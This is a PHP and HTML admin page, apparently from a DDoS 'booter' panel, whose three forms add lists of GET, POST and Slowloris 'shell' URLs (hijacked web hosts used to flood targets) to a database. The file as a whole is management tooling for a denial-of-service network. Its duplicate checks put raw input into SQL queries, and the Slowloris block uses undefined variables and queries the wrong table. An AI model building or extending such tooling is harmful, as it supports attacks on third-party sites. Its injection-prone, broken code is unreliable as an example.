<div id="content">
<div class="box">
    <h1>Add a Get Shell(s)</h1>
    <div class="box-content">
<center>
<form name="frmcontadd" action="" method="post">

  <textarea class="entryfield" name="url" cols=115 rows=10></textarea><br>
  <input class="button" type="submit" name="Submit" value="Add GET Shell(s)">

</form>
</center>
</div>
</div>
<div class="box">
    <h1>Add a POST Shell(s)</h1>
    <div class="box-content">
<center>
<form name="frmcontadd" action="" method="post">

  <textarea class="entryfield" name="url2" cols=115 rows=10></textarea><br>
  <input class="button" type="submit" name="Submit2" value="Add POST Shell(s)">

</form>
</center>
</div>
</div>
<div class="box">
    <h1>Add a Slowloris Shell(s)</h1>
    <div class="box-content">
<center>
<form name="frmcontadd" action="" method="post">

  <textarea class="entryfield" name="url3" cols=115 rows=10></textarea><br>
  <input class="button" type="submit" name="Submit3" value="Add Slowloris Shell(s)">

</form>
</center>
</div>
</div>
<?php

$link = mysql_connect(DB_SERVER, DB_USER, DB_PASS);
mysql_select_db(DB_DATABASE, $link);

// first the check of a submitted form
if (isset($_POST['Submit'])) {
  $hosts = explode("\r\n", $_POST['url']);
  // let's create the INSERT query
  $values = array();
  foreach ($hosts as $host) {

if($host != ""){
$sql = "SELECT * FROM `getshells` WHERE `url` = '".$host."'";
$res = mysql_query($sql);
if(mysql_num_rows($res) == 0){

    $values[] .= "('" . mysql_real_escape_string($host) . "')";

}
}
}
   
  $query = "INSERT INTO getshells (url) VALUES " . implode(',', array_unique($values));
  $result = mysql_query($query) or die("mysql error " . mysql_error() . " in query $query");
  echo '</br><center><h1>Successfully added <span>GET</span> Shells to the shells database.</h1></center>';
}

// then the form itself

// first the check of a submitted form
if (isset($_POST['Submit2'])) {
  $hosts2 = explode("\r\n", $_POST['url2']);
  // let's create the INSERT query
  $values = array();
  foreach ($hosts2 as $host2) {
  
if($host2 != ""){ // If the shell isn't blank
$sql2 = "SELECT * FROM `postshells` WHERE `url` = '".$host2."'";
$res2 = mysql_query($sql2);
if(mysql_num_rows($res2) == 0){ // If there aren't duplicates of the shell
    $values[] .= "('" . mysql_real_escape_string($host2) . "')"; // , add it too the array.
}
}
}
  
  $query = "INSERT INTO postshells (url) VALUES " . implode(',', array_unique($values));
  $result = mysql_query($query) or die("mysql error " . mysql_error() . " in query $query");
  echo '</br><center><h1>Successfully added <span>POST</span> Shells to the shells database.</h1></center>';
}
// then the form itself


// first the check of a submitted form
if (isset($_POST['Submit3'])) {
$hosts3 = explode("\r\n", $_POST['url3']);
  // let's create the INSERT query
  $values = array();
  foreach ($hosts3 as $host3) {

if($host3 != ""){ // If the shell isn't blank
$sql2 = "SELECT * FROM `postshells` WHERE `url` = '".$host3."'";
$res2 = mysql_query($sql3);
if(mysql_num_rows($res3) == 0){ // If there aren't duplicates of the shell
$values[] .= "('" . mysql_real_escape_string($host3) . "')";
}
}
    
    
  }
  $query = "INSERT INTO slowloris (url) VALUES " . implode(',', array_unique($values));
  $result = mysql_query($query) or die("mysql error " . mysql_error() . " in query $query");
  echo '</br><center><h1>Successfully added <span>Slowloris</span> Shells to the shells database.</h1></center>';
}
// then the form itself
?>
</div>
</div>